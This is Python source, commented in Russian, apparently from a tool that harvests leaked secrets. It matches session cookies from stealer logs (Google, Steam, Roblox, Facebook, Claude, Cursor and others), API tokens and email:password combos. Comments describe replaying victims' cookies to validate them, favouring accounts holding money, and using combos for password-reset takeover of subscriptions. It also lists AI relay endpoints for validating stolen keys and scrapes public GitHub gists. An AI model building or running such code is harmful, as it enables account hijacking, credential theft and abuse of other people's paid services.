    # 🐙 github токены: валидный = +1 в пул сканирования; с COPILOT-подпиской =
    # бесплатные GPT/Claude через api.githubcopilot.com — отдельный алмаз
    (
        "github-token",
        r"\b(gh[opsur]_[A-Za-z0-9]{20,45}|github_pat_[A-Za-z0-9_]{22,80})\b",
        [],
        False,
    ),
    # Google session cookies (stealer-логи/экспорты): бег 3+ кук SID/HSID/SAPISID.
    # Разделитель [;\s] потребляется ТОЛЬКО между куками (lookahead), иначе матч
    # прилипает к следующему слову и режется boundary-чеком экстрактора.
    # FP-fix (2026-09-05): lookbehind (?<![A-Za-z0-9_]) — иначе SSID матчится
    # СУФФИКСОМ внутри PHPSESSID, а & в value-классе склеивал query-string в
    # фейковый "бег кук" (SSID=..&PHPSESSID=.. сматчился как gcookie).
    (
        "gcookie",
        r"(?:(?<![A-Za-z0-9_])(?:__Secure-1PSID|__Secure-3PSID|__Secure-ENID|SAPISID|SID|HSID|SSID)"
        r"=[^;\"'\s&>]{10,}"
        r"(?:[;\s]+(?=(?<![A-Za-z0-9_])(?:__Secure-1PSID|__Secure-3PSID|__Secure-ENID|SAPISID|SID|HSID|SSID)=))?"
        r"){3,}",
        [],
        False,
    ),
    # netscape-формат логов: строки .google.com\tTRUE\t/\t...\tSAPISID\tvalue
    (
        "gcookie",
        r"(?m)^\.?(?:google|googleapis)\.com\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
        r"\t(?:SID|HSID|SSID|SAPISID|__Secure-[13]PAPISID|__Secure-1PSID)\t[^\s]{10,}"
        r"(?:\n\.?(?:google|googleapis)\.com\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
        r"\t(?:SID|HSID|SSID|SAPISID|__Secure-[13]PAPISID|__Secure-1PSID)\t[^\s]{10,}){2,}",
        [],
        False,
    ),
    # --- КУКИ-ВОЛНА: web-сессии из лог-дампов/конфигов/cookies.txt (Shodan).
    # Валидация — реплей куки на origin-хост (validate_websess), tag=websess.
    # WP auth-куки: wordpress_logged_in_<md5>=user%7Cexpiry%7Chmac (wp-admin!)
    (
        "websess",
        r"wordpress_(?:logged_in|sec)_[0-9a-f]{32}=[A-Za-z0-9%_.|\-]{20,}",
        [],
        False,
    ),
    # Laravel-сессия: encrypted base64-blob (eyJ...), 60+ симв
    (
        "websess",
        r"laravel_session=eyJ[A-Za-z0-9+/=]{60,}",
        [],
        False,
    ),
    # PHP: НЕ url-встроенные (lookbehind ?&/; отсекает сессии самого краулера)
    (
        "websess",
        r"(?<![?&/;])PHPSESSID=[A-Za-z0-9,\-]{26,32}",
        [],
        False,
    ),
    # Java: JSESSIONID из Cookie-заголовков лог-дампов (URL-rewrite ;jsessionid вон)
    (
        "websess",
        r"(?i)(?<![?&/;])jsessionid=[A-Za-z0-9.\-]{16,64}",
        [],
        False,
    ),
    # .NET: session + forms-auth тикет (.ASPXAUTH = залогиненный юзер!)
    (
        "websess",
        r"ASP\.NET_SessionId=[A-Za-z0-9_\-]{20,30}",
        [],
        False,
    ),
    (
        "websess",
        r"\.ASPXAUTH=[A-Za-z0-9+/=]{40,}",
        [],
        False,
    ),
    # Grafana admin-сессия (32-hex)
    (
        "websess",
        r"grafana_session=[0-9a-f]{32}",
        [],
        False,
    ),
    # Express signed-session (connect.sid=s%3A<id>.<sig>)
    (
        "websess",
        r"connect\.sid=(?:s%3A)?[A-Za-z0-9_\-.%]{24,}",
        [],
        False,
    ),
    # 🎮 ЖИРНЫЕ СЕССИИ (2026-09-10): аккаунты с деньгами/инвентарём.
    # Steam: steamLoginSecure=<steamid64>%7C%7C<token> — игры/баланс/маркет
    (
        "websess",
        r"steamLoginSecure=[A-Za-z0-9%_\-]{30,}",
        [],
        False,
    ),
    # Roblox: .ROBLOSECURITY=_|WARNING:...|_<blob> — акк с ROBUX/предметами
    (
        "websess",
        r"\.ROBLOSECURITY=_\|WARNING:[^|]{10,}\|_[A-Za-z0-9+/=]{80,}",
        [],
        False,
    ),
    # Instagram: sessionid (netscape-строки instagram.com — loose "sessionid"
    # слишком generic: Django/Flask все так называют)
    (
        "websess",
        r"(?m)^\.?instagram\.com\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
        r"\tsessionid\t[^\s]{20,}",
        [],
        False,
    ),
    # X/Twitter: auth_token (netscape twitter.com/x.com) — полная сессия
    (
        "websess",
        r"(?m)^\.?(?:twitter|x)\.com\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
        r"\tauth_token\t[0-9a-f]{40}",
        [],
        False,
    ),
    # Facebook: c_user + xs парой (netscape facebook.com)
    (
        "websess",
        r"(?m)^\.?facebook\.com\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
        r"\t(?:c_user|xs)\t[^\s]{15,}(?:\n\.?facebook\.com\t(?:TRUE|FALSE)\t\S+"
        r"\t(?:TRUE|FALSE)\t\d+\t(?:c_user|xs)\t[^\s]{15,})",
        [],
        False,
    ),
    # Reddit: reddit_session (netscape reddit.com)
    (
        "websess",
        r"(?m)^\.?reddit\.com\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
        r"\treddit_session\t[^\s]{20,}",
        [],
        False,
    ),
    # Twitch: auth-token (netscape twitch.tv) — стример-аккаунт
    (
        "websess",
        r"(?m)^\.?twitch\.tv\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
        r"\tauth-token\t[0-9a-z]{30}",
        [],
        False,
    ),
    # 🤖 AI-ПОДПИСКИ (2026-09-10): сессии на сервисы с сильными моделями.
    # Cursor (WorkOS JWT-сессия): Pro = GPT/Claude в редакторе
    (
        "cursor-web",
        r"WorkosCursorSessionToken=eyJ[A-Za-z0-9_\-.]{100,}",
        [],
        False,
    ),
    # Microsoft Copilot/Office: MSPAuth (live.com сессия)
    (
        "websess",
        r"MSPAuth=[A-Za-z0-9!*$%_\-]{100,}",
        [],
        False,
    ),
    # Poe (Quora): m-b cookie — Claude/GPT в одном акке
    (
        "websess",
        r"(?m)^\.?poe\.com\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
        r"\tm-b\t[^\s]{20,}",
        [],
        False,
    ),
    # Perplexity Pro: next-auth session-token (netscape perplexity.ai)
    (
        "websess",
        r"(?m)^\.?perplexity\.ai\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
        r"\t__Secure-next-auth\.session-token\t[^\s]{50,}",
        [],
        False,
    ),
    # Supabase auth cookie (Lovable/Bolt/тысячи supabase-аппов): sb-<ref>-
    # auth-token = JSON {access_token, refresh_token} — refresh = вечная сессия
    (
        "supabase-auth",
        r"sb-[a-z0-9]{15,25}-auth-token(?:\.0)?=(?:base64-)?[A-Za-z0-9%_.+/=\-]{60,}",
        [],
        False,
    ),
    # Claude web: sessionKey (netscape claude.ai — loose sid01 ловит value,
    # тут фиксируем домен для чистого origin)
    (
        "websess",
        r"(?m)^\.?claude\.ai\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
        r"\tsessionKey\tsk-ant-sid0[12]-[A-Za-z0-9_\-]{20,}",
        [],
        False,
    ),
    # Discord: token (не кука, но та же ценность — в шодан-разделе есть запрос)
    # Generic Cookie-заголовок из лог-дампов: бег 2+ кук (capture = весь header).
    # Разделитель потребляется ТОЛЬКО между куками (lookahead, как в gcookie) —
    # иначе матч прилипает к следующей строке лога и режется boundary-чеком.
    # (?<![a-zA-Z\-]) отсекает "Set-Cookie:" (это сессия краулера, не жертвы).
    # имя до 64 симв: WP-куки = wordpress_logged_in_ + md5 = 52 симв!
    (
        "websess",
        r"(?<![a-zA-Z\-])Cookie\"?\s*:\s*\"?\s*((?:[A-Za-z0-9_.\-]{1,64}=[^;\s\"'<>]{4,}"
        r"(?:[;\s]+(?=[A-Za-z0-9_.\-]{1,64}=[^;\s\"'<>]{4,}))?){2,})",
        [],
        False,
    ),
    # Netscape cookies.txt (НЕ-google: гугловые ловит gcookie-паттерн выше;
    # одинаковый спан -> одинаковый khash -> первый (gcookie) выигрывает).
    # Первая строка со значением 6+, продолжение 2+ (короткие remember=1 не рвут блок)
    (
        "websess",
        r"(?m)^\S+\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+\t[A-Za-z0-9_.\-]{2,32}\t[^\s]{6,}"
        r"(?:\n\S+\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+\t[A-Za-z0-9_.\-]{2,32}\t[^\s]{2,}){1,}",
        [],
        False,
    ),
    # JWT access/refresh токены из API-дампов (access_token-запросы Shodan)
    (
        "jwt",
        r"\beyJ[A-Za-z0-9_\-]{12,}\.[A-Za-z0-9_\-]{12,}\.[A-Za-z0-9_\-]{8,}\b",
        [],
        False,
    ),
    # --- сервисные токены (высокий yield в утечках): Discord/Airtable/Notion/SendGrid
    (
        "discord",
        r"M[MT][A-Za-z0-9_\-]{21,}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{25,}",
        [],
        False,
    ),
    ("airtable", r"pat[A-Za-z0-9]{14}\.[0-9a-f]{64}", [], False),
    # АУДИТ-фикс: ntn_-токены длиннее 43 после префикса — {43} обрезал живые
    # ключи (boundary-check потом ронял матч вообще). {43,} + граница сама
    # отсечёт хвост.
    ("notion", r"(?:ntn_|secret_)[A-Za-z0-9]{43,}", [], False),
    ("sendgrid", r"SG\.[A-Za-z0-9_\-]{16,}\.[A-Za-z0-9_\-]{16,}", [], False),
]
KNOWN_PREFIX_BLACKLIST = (
    "sk-https",
    "sk-http",
    "sk-none",
    "sk-your",
    "sk-xxx",
    "sk-test",
    "sk-abc",
    "sk-1234",
    "sk-example",
    "sk-placeholder",
    "sk-insert",
    "sk-replace",
    "sk-ant-api03-xxxx",
    "sk-or-v1-xxxxx",
    "sk-or-v1-your",
    "sk-proj-your",
    "sk-ant-your",
    "sk-oa-v1-your",
)
# плейсхолдеры в ЛЮБОЙ части ключа (доки-примеры из shodan-html);
# ВНИМАНИЕ: без "xxx" — реальный sensenova-ключ содержит XXX в середине
# pt/es-плейсхолдеры — только с разделителями (чтобы не убить реальные ключи)
PLACEHOLDER_SUBSTR_RE = re.compile(
    r"your[-_]?(api|key|token|secret)|(api|key|token|secret)[-_]here|"
    r"placeholder|insert[-_]?your|replace[-_]?your|example[-_]?(key|token|api)|"
    r"[-_](aqui|chave|sua|seu|poner|clave)[-_]|redacted|changeme",
    re.I,
)
# ДОКИ-ПЛЕЙСХОЛДЕРЫ из github-issues/grep.app: sk-ant-api03-test-key-for-...,
# sk-ant-api03-AAAAAAAA..., sk-ant-oat01-aaaBBBcccDDDeee, abcdefghij...
JUNKY_KEY_RE = re.compile(
    # АУДИТ-КРИТ-ФИКС: в альтернации с захватывающими группами \1 ссылался
    # на ПЕРВУЮ группу паттерна ((key|token|api)), а НЕ на (.) — детектор
    # прогонов был мёртв с рождения (sk-xxxxxxxx... проходил на ура).
    # Все группы — незахватывающие, (.) остаётся группой №1.
    r"test[-_]?(?:key|token|api)|fake[-_]|dummy[-_]?(?:key|token)|"
    r"sample[-_]?(?:key|token)|abcdefgh|aaabbb|qwerty|"
    r"(.)\1{7,}",  # прогон одного символа 8+ раз (AAAAAAA...)
    re.I,
)
# АНТИ-SLUG: sk-<только lowercase-слова через дефис> = CSS-классы/текстовые
# слаги из JS/HTML (sk-content-wrapper, sk-belfast-riots-anti-immigration).
# У реального ключа на 20+ символах ВСЕГДА есть цифры/заглавные/подчёркивания;
# структурные префиксы (sk-ant-oat01, sk-or-v1) содержат цифры — не задевает.
SK_SLUG_RE = re.compile(r"^sk-[a-z]+(?:-[a-z]+)+$")  # >=1 дефис-группа
# (было (?:-[a-z]+)* — ноль групп = ЛЮБОЙ sk- + lowercase без дефисов
# считался CSS-слагом и резал настоящие длинные токены: 24 ключа ушли мимо)

URL_RE = re.compile(r"https?://[A-Za-z0-9\.\-_]+(?::\d+)?(?:/[A-Za-z0-9\.\-_/]*)?")
BASE_HINT_RE = re.compile(
    r"(base[_-]?url|api[_-]?base|endpoint|proxy[_-]?url|url|host)\s*[=:]\s*[\"']?([^\"'\s,}]+)",
    re.I,
)
APIISH = re.compile(
    r"(api|/v1|/v2|/v4|llm|openai|proxy|gateway|maas|compatible|inference|"
    r"chat|dashscope|modelscope|siliconflow|bigmodel|moonshot|deepseek|sensenova|qianfan)",
    re.I,
)
SKIP_URL_RE = re.compile(
    r"(github\.com|t\.me/|telegram|shodan\.io|youtube|w3\.org|google\.com|duckduckgo|"
    r"bing\.com|huggingface\.co/search|greynoise|schema|example\.com|localhost)"
)
# base-URL НЕ может быть API-эндпоинтом: логин-страницы, трекеры, дашборды,
# статические страницы моделей. Иначе мусорные base-hint'ы -> false-positive валиды.
BAD_BASE_RE = re.compile(
    r"(\.php|/login|/signin|/signup|/logout|/apikeys|/console|dashboard\.|/track|"
    r"beacon|clarity|/wp-content|/models?/|\.html?$|/blob/|/search|/pricing|/docs)",
    re.I,
)


def bad_base(url):
    if not url:
        return False
    # известные релеи — легитимны всегда (agentrouter/gorouter и пр. без
    # apiish-подстроки в хосте не должны отбрасываться)
    if url.rstrip("/") in KNOWN_BASES:
        return False
    # BAD_BASE_RE применяем К ПУТИ, а не к полному URL (было: search/docs/
    # track/clarity/beacon матчились внутри ИМЕНИ ХОСТА —
    # https://search.foo.com/v1, https://docs.foo.com, https://clarity.ai
    # ложно отвергались как «мусорные»)
    try:
        path = urlparse(url).path or ""
    except Exception:
        path = url
    return bool(BAD_BASE_RE.search(path))


KNOWN_BASES = {
    "https://api.deepseek.com": None,
    "https://api.deepseek.com/v1": None,
    "https://dashscope.aliyuncs.com/compatible-mode/v1": None,
    "https://dashscope-intl.aliyuncs.com/compatible-mode/v1": None,
    "https://api-inference.modelscope.cn/v1": None,
    "https://api-inference.modelscope.ai/v1": None,
    "https://api.siliconflow.cn/v1": None,
    "https://qianfan.baidubce.com/v2": None,
    "https://open.bigmodel.cn/api/paas/v4": None,
    "https://api.moonshot.cn/v1": None,
    "https://api.moonshot.ai/v1": None,
    "https://api.stepfun.com/v1": None,
    "https://api.mistral.ai/v1": None,
    "https://api.voyageai.com/v1": None,
    "https://token.sensenova.cn/v1": None,
    "https://openrouter.ai/api/v1": None,
    "https://api.groq.com/openai/v1": None,
    "https://api.together.xyz/v1": None,
    "https://api.anthropic.com": None,
    "https://api.openai.com/v1": None,
    "https://api.x.ai/v1": None,
    "https://llmapi.paratera.com/v1": None,
    "https://chat.intern-ai.org.cn/api/v1": None,
    "https://api.qnaigc.com/v1": None,
    "https://token-plan-cn.xiaomimimo.com/v1": None,
    "https://kspmas.ksyun.com/v1": None,
    # из анализа TG-выгрузок (реальные хосты утечек)
    "https://api.stability.ai/v1": None,
    "https://aihubmix.com/v1": None,
    "https://api.xkiro.com/v1": None,
    "https://api.apiyi.com/v1": None,
    "https://router.bynara.id/v1": None,
    "https://ai.sumopod.com/v1": None,
    "https://api.agnes-ai.cn/v1": None,
    "https://api.xiaomimimo.com/v1": None,
    "https://models.sjtu.edu.cn/api/v1": None,
    "https://api.chatanywhere.tech/v1": None,
    # жирные relay из TG-разведки (opus/fable живут тут)
    "https://api.weelinking.com/v1": None,
    "https://api.laozhang.ai/v1": None,
    "https://api.nexusmind.digital/v1": None,
    "https://v2.aicodee.com/v1": None,
    "https://api.megallm.io/v1": None,
    "https://api.bluesminds.com/v1": None,
    "https://api.ppq.ai/v1": None,
    "https://api.lkeap.cloud.tencent.com/v1": None,
    "https://api.sarvam.ai/v1": None,
    "https://benchlm.ai/v1": None,
    "https://api.aeramc.su/v1": None,
    "https://ttqq.inping.com/v1": None,
    "https://tunnel.zhishe.top/v1": None,
    "https://lonlie.plus7.plus/v1": None,
    "https://stream.camelai.com/v1": None,
    "https://llm.alem.ai/v1": None,
    "https://api.iamhc.cn/v1": None,
    "https://api.sea-lion.ai/v1": None,
    "https://api.notegen.top/v1": None,
    "https://api.emlylabs.com/v1": None,
    "https://llm.app.emlylabs.com/v1": None,
    # старые релеи (рабочие ключи в сторе)
    "https://api.closeai-proxy.xyz/v1": None,
    "https://api.tu-zi.com/v1": None,
    "https://yunwu.ai/v1": None,
    "https://www.dmxapi.cn/v1": None,
    "https://api.gptsapi.net/v1": None,
    "https://api.pro365.top/v1": None,
    "https://api.v3.cm/v1": None,
    "https://logfare.ai/v1": None,
    # ==== чат-разведка, волна 2 (подтверждённые Base URL из отчётов) ====
    "https://api.elevenlabs.io/v1": None,
    "https://api.us-west-2.modal.direct/v1": None,
    "https://inference.baseten.co/v1": None,
    "https://api.inceptionlabs.ai/v1": None,
    "https://hub.linux.do/v1": None,
    "https://chat.ecnu.edu.cn/open/api/v1": None,
    "https://www.sophnet.com/api/open-apis/v1": None,
    "https://api.hunyuan.cloud.tencent.com/v1": None,
    "https://api.z.ai/api/paas/v4": None,
    "https://api.aimlapi.com/v1": None,
    "https://api.studio.nebius.ai/v1": None,
    "https://api.tokenfactory.us-central1.nebius.com/v1": None,
    "https://api.morphllm.com/v1": None,
    "https://llm.0mod.com/v1": None,
    "https://llmmelon.cloud/v1": None,
    "https://tokenrhythm.studio/v1": None,
    "https://api.vectorengine.ai/v1": None,
    "https://ai.paratera.com/v1": None,
    "https://uni-api.cstcloud.cn/v1": None,
    "https://routellm.abacus.ai/v1": None,
    "https://www.genspark.ai/api/llm_proxy/v1": None,
    "https://api.cohere.ai/compatibility/v1": None,
    "https://api.portkey.ai/v1": None,
    "https://agentrouter.org": None,
    "https://gorouter.app": None,
    "https://api.tokenrouter.com/v1": None,
    "https://api.xty.app/v1": None,
    "https://api.askcodi.com/v1": None,
    "https://api.ilmu.ai/v1": None,
    "https://chat-ai.academiccloud.de/v1": None,
    "https://api.gpugeek.com/v1": None,
    "https://api-ai.gitcode.com/v1": None,
    "https://code.cu.ac.kr/llm/v1": None,
    "https://litemaas.rhoai.rh-aiservices-bu.com/v1": None,
    "https://freeai.up.railway.app/v1": None,
    "https://www.xiaoyaoapi.com/v1": None,
    "https://x666.me/v1": None,
    "https://api.hcnsec.cn/v1": None,
    "https://new-api.xt-url.com/v1": None,
    "https://newapi.pockgo.com/v1": None,
    "https://newapi-jp1.202820.xyz/v1": None,
    "https://aicredits.in/api/v1": None,
    "https://api.p0.systems/api/agents/v1": None,
    "https://bridge.ai.axxes.com/v1": None,
    "https://llm.ganeshnayak.in/v1": None,
    "https://api.dev.runwayml.com/v1": None,
    "https://api.deepgram.com/v1": None,
    "https://maas-api.cn-huabei-1.xf-yun.com/v1": None,
    "https://api-ap-southeast-1.modelarts-maas.com/v1": None,
    "https://developer.amd.com.cn/radeon/api/v1": None,
    "https://api.fireworks.ai/inference/v1": None,
    "https://opencode.ai/zen/v1": None,
    "https://opencode.ai/zen/go/v1": None,
    # релеи из ZK-экспорта (2026-09-10): там ходят ключи — базы нужны валидатору
    "https://apinex.bond/v1": None,
    "https://linkapi.ai/v1": None,
    "https://free.sysik.mom/v1": None,
    "https://flag.smarttrot.com/v1": None,
    "https://litellm.in.dev.spotdraft.com/v1": None,
    # ==== 🚀 GLM-5.x / Kimi-K3 КЭРРИЕРЫ (экспансия 2026-09-10) ====
    # официалы + провайдеры, у которых реально хостятся glm/kimi — ключи
    # от этих баз = доступ к флагманским моделям, а не к фри-хламу
    "https://api.deepinfra.com/v1/openai": None,
    "https://api.novita.ai/v3/openai": None,
    "https://api.novita.ai/v1": None,
    "https://api.cerebras.ai/v1": None,
    "https://api.sambanova.ai/v1": None,
    "https://api.chutes.ai/v1": None,
    "https://api.featherless.ai/v1": None,
    "https://api.parasail.io/v1": None,
    "https://api.hyperbolic.xyz/v1": None,
    "https://api.nineteen.ai/v1": None,
    "https://api.lambdalabs.com/v1": None,
    "https://api.glhf.chat/v1": None,
    "https://router.requesty.ai/v1": None,
    "https://api.lingyiwanwu.com/v1": None,
    "https://api.minimax.io/v1": None,
    "https://api.minimax.chat/v1": None,
    "https://ark.cn-beijing.volces.com/api/v3": None,
    "https://spark-api-open.xf-yun.com/v1": None,
    "https://api.baichuan-ai.com/v1": None,
    "https://api.baseten.co/v1": None,
}
# Базы, отдающие /models ВООБЩЕ без auth (проверено живьём 2026-09-10:
# aimlapi — 937 моделей на голый GET). listed_only на них доказывает ноль —
# валидатор скипает такие записи (chat на мусоре там всё равно 401).
PUBLIC_MODELS_BASES = {
    "https://api.aimlapi.com/v1",
    "https://api.ppq.ai/v1",
}
# для hex* с контекстом: если контекст-URL без явного base — не валидируем (шум)
CONTEXT_WINDOW = 350


def find_base_in_context(ctx):
    for hm in BASE_HINT_RE.finditer(ctx):
        u = hm.group(2)
        if (
            u.startswith("http")
            # известные релеи принимаем без apiish-подстроки (было:
            # agentrouter.org/gorouter.app из KNOWN_BASES отбрасывались)
            and (APIISH.search(u) or u.rstrip("/") in KNOWN_BASES)
            and not SKIP_URL_RE.search(u)
            and not bad_base(u)
        ):
            return u.rstrip("/,;\"')")
    for um in URL_RE.finditer(ctx):
        u = um.group(0).rstrip("/")
        if (
            (APIISH.search(u) or u in KNOWN_BASES)
            and not SKIP_URL_RE.search(u)
            and not bad_base(u)
        ):
            return u
    return None


# email:pass комбо (комболисты → почта → magic-link/reset на подписки)
EMAIL_PASS_RE = re.compile(
    r"\b([A-Za-z0-9._%+-]{2,64}@[A-Za-z0-9.-]+\.[A-Za-z]{2,})\s*[:;|]\s*"
    r"([^\s:;|\"']{6,64})"
)
CRED_BAD_DOMAINS = (
    "example.com",
    "example.org",
    "test.com",
    "domain.com",
    "email.com",
    "localhost",
    "sentry.io",
    "w3.org",
    "schema.org",
    "github.com",
    "yourcompany.com",
    "company.com",
    "mysite.com",
    "site.com",
)
CRED_BAD_PASS = {
    "password",
    "password1",
    "qwerty",
    "qwerty123",
    "123456",
    "12345678",
    "123456789",
    "changeme",
    "secret",
    "pass1234",
    "admin",
    "admin123",
    "letmein",
    "welcome1",
    "iloveyou",
    "yourpassword",
    "example",
    "test123",
    "placeholder",
    "none",
    "null",
    "pass",
    "root",
    "toor",
    "user",
}


def extract_email_creds(text, limit=20):
    """email:pass / email;pass / email|pass комбо. Возвращает (email, pwd)."""
    out = []
    for m in EMAIL_PASS_RE.finditer(text):
        email, pwd = m.group(1), m.group(2)
        # double-@ = не email, а DSN-фрагмент (GOCSPX-xxx@pooler.supabase.com,
        # user@host из postgres-строки) — IMAP-валидатор бы тратил на них
        # коннекты впустую
        if email.count("@") != 1:
            continue
        dom = email.rsplit("@", 1)[-1].lower()
        if dom in CRED_BAD_DOMAINS or dom.endswith((".png", ".jpg", ".js")):
            continue
        pl = pwd.lower()
        if pl in CRED_BAD_PASS or "your" in pl or "xxxx" in pl:
            continue
        if any(c in pwd for c in "<>{}[]()"):
            continue  # это код/HTML, не пароль
        if pwd.startswith(("GOCSPX-", "sk-", "xox", "ghp_", "glpat-")):
            continue  # это токен, а не пароль почты
        out.append((email, pwd))
        if len(out) >= limit:
            break
    return out


def extract_candidates(text):
    out = []
    KEYCH = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-"
    for tag, pat, bases, ctx_req in KEY_PATTERNS:
        for m in re.finditer(pat, text):
            # bearer-паттерн имеет capture-группу — берём чистый ключ без "Bearer "
            if m.groups() and m.group(1):
                key = m.group(1)
                mstart, mend = m.start(1), m.end(1)
                mfull = m.start()  # старт ПОЛНОГО матча (для левой границы)
            else:
                key = m.group(0)
                mstart, mend = m.start(), m.end()
                mfull = mstart
            # АНТИ-ПРЕФИКС: матч — кусок более длинного токена? (sk20/skgen режут oat01!)
            if mend < len(text) and text[mend] in KEYCH:
                continue
            # АУДИТ-фикс: левую границу меряем по ПОЛНОМУ матчу, не по группе:
            # capture-паттерны (mailgun "key-([hex])", okta "SSWS (токен)")
            # имеют префикс ФОРМАТА прямо перед группой — проверка по группе
            # ложно убивала их ("key-" = часть формата, не кусок длинного токена)
            if mfull > 0 and text[mfull - 1] in "_-":
                continue
            # АУДИТ-фикс: startswith по блэклисту убивал РЕАЛЬНЫЕ ключи вида
            # sk-1234abcd... (случайное совпадение 1/62^4, при миллионах
            # кандидатов — считаные, но живые потери). Требуем разделитель
            # после префикса или точное совпадение.
            _kl = key.lower()
            if any(
                _kl == p or (_kl.startswith(p) and _kl[len(p)] in "-_.")
                for p in KNOWN_PREFIX_BLACKLIST
            ):
                continue
            if PLACEHOLDER_SUBSTR_RE.search(key):
                continue
            if JUNKY_KEY_RE.search(key):
                continue  # доки-плейсхолдеры: test-key, AAAAAAA, abcdefgh
            if len(key) >= 14 and SK_SLUG_RE.match(key):
                continue  # CSS-слаги: sk-content-wrapper, sk-lightbox-image-...
            # NL-слаги документов: "sk-elghund-graa-h2", "sk-coverage-form---
            # aiic-dp-09-br-01-08" — дефисные человеческие слова. Настоящие
            # ключи после sk- — один цельный токен (deepseek hex32 без дефисов,
            # proj/ant-префиксы с mixed-case). Убивает спам-валидации на
            # free-релеях (ppq/aimlapi "валидируют" любой мусор).
            if tag in ("skgen", "sk20", "sk32", "sklong", "bearer") and re.fullmatch(
                r"[a-z]{2,}(?:-+[a-z]+[0-9]*|-+[0-9]+){2,}", key
            ):
                continue
            # NL-слаги MIXED-CASE: "sk-Foto-Gage-Skidmore-lanka-till-1146x478"
            # (имена файлов с фотостоков). 4+ сегмента, 3+ из них — чисто
            # буквенные слова. Порог 3 (был 2): сегментированные ключи вида
            # sk-WK-rM6H3V-XBxYB-AUnn выживают, трёхсловные слаги режутся.
            # АУДИТ-фикс: +bearer — slug через bearer-паттерн раньше пролетал мимо
            if tag in ("skgen", "sk20", "sk32", "sklong", "bearer"):
                segs = key.split("-")
                if len(segs) >= 4:
                    alpha_segs = sum(
                        1 for s in segs if re.fullmatch(r"[A-Za-z]{3,}", s or " ")
                    )
                    if alpha_segs >= 3 and all(
                        re.fullmatch(r"[A-Za-z0-9]+", s or " ") for s in segs
                    ):
                        continue
            # UNDERSCORE-СЛАГИ (волна 2026-09-10, датский фотосток):
            # sk-andetsprog_41c7665f6a, sk-musik-forside_189073ff65 —
            # слова через "_"/"-" + короткий hex-хвост. У настоящих ключей
            # тело mixed-case/цифры целиком, а не "слово_слово_hex".
            if tag in ("skgen", "sk20", "sk32", "sklong", "bearer") and re.fullmatch(
                r"sk-[a-z]{3,}(?:[-_][a-z]{2,})*[-_][0-9a-f]{6,14}", key
            ):
                continue
            if len(set(key.lower())) <= 3:
                continue  # мусор: aaaaaa / abcabc / 111111
            if key in ("https", "http"):
                continue
            ctx = text[max(0, mstart - CONTEXT_WINDOW) : mend + CONTEXT_WINDOW]
            base = find_base_in_context(ctx)
            if ctx_req and not base:
                continue
            out.append((key, tag, base))
    # email:pass комбо (макс 20 на чанк) — key хранится как "email|pass"
    for email, pwd in extract_email_creds(text):
        out.append(("%s|%s" % (email, pwd), "email-cred", None))
    # 🔧 P0 ПОЧТЫ: MAIL_USERNAME=... MAIL_PASSWORD=... сплиты из .env —
    # главный экстрактор их НЕ ловил (только shodan-свип). Доказано живым
    # прогоном mail-farm: 115 кред -> 3 живых ящика с подписками.
    # Сплит-формат Laravel/Django из закоммиченных .env — главный источник.
    for email, pwd in _ENV_SMTP_RE.findall(text or ""):
        pwd = pwd.rstrip("\"';,)")
        if len(pwd) >= 6 and "@" in email:
            _k = "%s|%s" % (email, pwd)
            if _k not in [x for x, _, _ in out]:
                out.append((_k, "email-cred", None))
    # baseten: 8.32 ключ (aEXAlxkF.x32) — только рядом с baseten-контекстом
    # (без контекста это случайный мусор вида слов.слов)
    # АУДИТ-фикс: re.I — "Baseten"/"BASETEN" в mixed-case раньше не матчились
    if re.search(r"baseten|inference\.baseten", text or "", re.I):
        for m in _BASETEN_KEY_RE.finditer(text):
            k = m.group(0)
            if not any(b in k.lower() for b in _BASETEN_BAD):
                if k not in [x for x, _, _ in out]:
                    out.append((k, "baseten", None))
    # kimi web refresh_token: JWT с HS512-подписью user-center
    # (живой токен = безлимитный kimi-k3 через kimi.moonshot.cn web API)
    # ВАЖНО: общий JWT-экстрактор выше ловит их первым как 'jwt' —
    # перетегируем kimi-паттерн в 'kimi-web' (валидатор другой!)
    for m in re.finditer(
        r"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9\.[A-Za-z0-9_\-]{40,300}\.[A-Za-z0-9_\-]{20,100}",
        text,
    ):
        tok = m.group(0)
        out = [(k, ("kimi-web" if k == tok else t), b) for k, t, b in out]
        if tok not in [k for k, _, _ in out]:
            out.append((tok, "kimi-web", None))
    return out


# ------------------------------------------------------------------ SOURCES
class Source:
    name = "?"

    def fetch(self):
        return []


class Gists(Source):
    name = "github-gists"

    def fetch(self):
        out = []
        headers = {"Accept": "application/vnd.github+json"}
        _gtok = gh_token()  # один вызов = один слот ротации (было: проверка
        # и хедер звали gh_token() дважды — проверялся не тот токен)
        if _gtok:
            headers["Authorization"] = "Bearer " + _gtok
        pages = max(1, int(CFG.get("deep_gists_pages") or 1))  # --deep: xN страниц
        gists = []
        # АУДИТ-фикс: общий try вокруг ВСЕХ страниц — один сетевой сбой на
        # стр.3 выбрасывал уже собранные 200 гистов. Per-page try + break.
        for pg in range(1, pages + 1):
            try:
                r = http(
                    "GET",
                    "https://api.github.com/gists/public?per_page=100&page=%d" % pg,
                    timeout=(8, 15),
                    headers=headers,
                )
                if r is None or r.status_code != 200:
                    log(
                        "  [github-gists] HTTP%s (rate?)"
                        % (r.status_code if r else "None")
                    )
                    break
                batch = r.json()
                if not batch:
                    break
                gists += batch
            except Exception:
                break
        gists = gists[: CFG["max_gists"] * pages]
        with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
            futs = {}
            for g in gists:
                desc = (g.get("description") or "").lower()
